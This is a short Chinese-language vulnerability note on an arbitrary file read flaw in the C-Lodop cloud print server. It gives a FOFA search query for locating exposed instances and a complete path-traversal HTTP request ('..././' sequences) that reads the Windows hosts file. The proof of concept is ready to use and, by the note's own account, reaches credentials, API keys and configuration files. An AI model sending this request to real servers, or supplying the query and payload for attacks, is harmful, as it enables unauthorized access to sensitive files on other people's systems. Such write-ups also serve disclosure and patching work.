# C-Lodop打印服务系统存在任意文件读取漏洞

# 一、漏洞简介
C-Lodop云打印服务器是一款非常好用且受欢迎的专业云打印软件，简单实用，易操作。攻击者可利用此漏洞获取服务器上的任意文件，包括数据库凭据、API密钥、配置文件等，从而获取系统权限和敏感信息。

# 二、影响版本
+ C-Lodop打印服务系统

# 三、资产测绘
+ fofa`"C-Lodop" && icon_hash="-329747115"`
+ 特征

![1708149014735-a271087e-43e2-4581-b58f-bf1ea1c76ccb.png](./img/nMpcvRKOmZw8jtUJ/1708149014735-a271087e-43e2-4581-b58f-bf1ea1c76ccb-469585.png)

# 四、漏洞复现
```plain
GET /..././..././..././..././Windows/System32/drivers/etc/hosts HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
```

![1708149061920-15696431-0199-4458-b957-771df9fb1277.png](./img/nMpcvRKOmZw8jtUJ/1708149061920-15696431-0199-4458-b957-771df9fb1277-034670.png)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cg548zol8agvqu5o>